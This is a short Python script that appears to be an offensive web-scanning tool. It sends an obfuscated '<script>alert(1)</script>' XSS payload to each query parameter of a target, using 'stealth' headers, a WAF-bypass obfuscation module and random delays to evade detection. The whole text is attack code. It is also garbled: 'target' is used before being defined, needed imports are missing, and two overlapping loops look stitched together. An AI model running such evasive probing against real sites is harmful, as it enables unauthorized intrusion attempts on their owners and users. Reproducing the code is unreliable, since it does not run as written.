from mods.stealth_headers import stealth_headers
from mods.param_variants import param_keys
from mods.waf_bypass_ai import obfuscate_payload
from mods.suit_h1_verified import suit

for endpoint in suit["navigate"]:
    requests.get(target + endpoint, headers=suit["headers"])

for param in suit["params"]:
    crafted = suit["obfuscate"]("<script>alert(1)</script>")
    requests.get(f"{target}?{param}={crafted}", headers=suit["headers"])
    time.sleep(random.choice(suit["delay"]))
target = "https://example.com"
payload = "<script>alert(1)</script>"

for param in param_keys:
    url = f"{target}?{param}=" + obfuscate_payload(payload)
    response = requests.get(url, headers=stealth_headers)
